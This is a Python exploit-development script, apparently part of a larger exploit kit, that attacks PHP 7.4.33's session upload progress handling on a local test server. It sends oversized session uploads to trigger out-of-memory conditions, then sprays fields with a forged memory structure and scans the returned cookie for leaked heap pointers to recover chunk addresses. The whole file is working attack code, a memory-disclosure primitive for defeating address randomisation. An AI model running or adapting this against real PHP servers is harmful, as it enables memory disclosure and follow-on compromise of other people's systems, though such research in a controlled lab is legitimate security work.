"""Try to trigger OOM via session data growth on 7.4.33.
The idea: grow the session data to exceed memory_limit, triggering OOM.
"""
import sys, os, time, struct
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import exploit as E
from collections import Counter

def test_session_growth(port, session_size_mb, label):
    """Test session data growth to trigger OOM."""
    URL = f"http://127.0.0.1:{port}/"
    t = E.Target(URL, timeout=180.0, verbose=False)

    # Request 1: Create session and store large data
    parts = [
        {"name": "PHPSESSID", "data": b"\x00"},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        {"name": "f", "filename": "a.txt", "data": b"A" * 64},
    ]
    # Store large session data
    parts.append({"name": "big", "data": b"B" * int(session_size_mb * 1024 * 1024)})
    print(f"  {label}: session growth {session_size_mb}MB", flush=True)

    try:
        r1 = t.post(E.build_multipart(parts, b"S" * 17), b"S" * 17, read_cap=1 << 20, timeout=180)
    except Exception as e:
        print(f"    REQUEST1 ERROR: {e}", flush=True)
        return False
    time.sleep(0.5)

    # Request 2: Try to leak
    parts = [
        {"name": "PHPSESSID", "data": E.SID},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    for i in range(841):
        val = (f"v{i:04d}" + "x" * 44)[:48]
        parts.append({"name": str(1000 + i), "data": val.encode()})
    forge = bytearray(b"A" * 79)
    struct.pack_into("<Q", forge, 0x10, 0x1000)
    forge[0x18] = ord("L")
    parts.append({"name": "1999", "data": bytes(forge)})
    try:
        r2 = t.post(E.build_multipart(parts, b"B" * 10), b"B" * 10, read_cap=9 << 20, timeout=180)
    except Exception as e:
        print(f"    REQUEST2 ERROR: {e}", flush=True)
        return False
    raw = E.parse_cookie(r2)
    oom = len(raw) > 100
    c = Counter()
    for i in range(0, len(raw) - 8, 8):
        v = int.from_bytes(raw[i:i + 8], "little")
        if 0x700000000000 <= v < 0x800000000000:
            c[v & ~0x1FFFFF] += 1
    chunk = c.most_common(1)[0][0] if c else 0
    tag = " *** OOM/LEAK ***" if oom else "(no OOM)"
    chunk_str = f" chunk=0x{chunk:x}" if chunk else ""
    print(f"    cookie={len(raw)}B{tag}{chunk_str}", flush=True)
    return oom

print("=== Session growth OOM test on 7.4.33 ===", flush=True)
test_session_growth(18108, 30, "7.4.33")
time.sleep(1)
test_session_growth(18108, 60, "7.4.33")
time.sleep(1)
test_session_growth(18108, 90, "7.4.33")
time.sleep(1)

print("\n=== done ===", flush=True)
